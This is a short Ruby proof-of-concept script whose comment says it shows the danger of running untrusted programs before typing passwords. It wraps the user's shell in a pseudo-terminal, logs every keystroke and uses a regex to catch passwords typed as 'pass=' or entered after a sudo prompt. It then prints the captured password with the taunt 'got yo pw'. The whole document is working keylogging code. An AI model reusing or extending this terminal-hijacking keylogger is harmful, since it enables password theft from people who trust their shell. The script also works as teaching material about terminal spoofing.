# this is to show that you should not run
# untrusted programs and after that enter passwords while
# assuming your terminal is still the real thing
begin
  STATE = `stty -g`
  system("stty raw -echo -icanon isig")

  STDIN.sync = true

  def io_copy(from, to)
    loop do
      IO.select([from])
      data = from.read_nonblock(100_000)
      yield(data) if block_given?
      to.write(data)
    end
  end

  require 'pty'
  PTY.spawn(ENV.fetch('SHELL', 'bash')) do |r, w, pid|
    Thread.new{io_copy(r, STDOUT)}
    f = ''
    io_copy(STDIN, w) do |data|
      f << data
      if f =~ /(pass|password|pw)\s*=\s*(\S+)\s|(sudo)\s*\n([^\n]+\n)/
        `stty #{STATE}`
        puts ''
        puts "got yo pw"
        puts $2
        exit(12)
      end
    end
  end

ensure
  `stty #{STATE}`
end
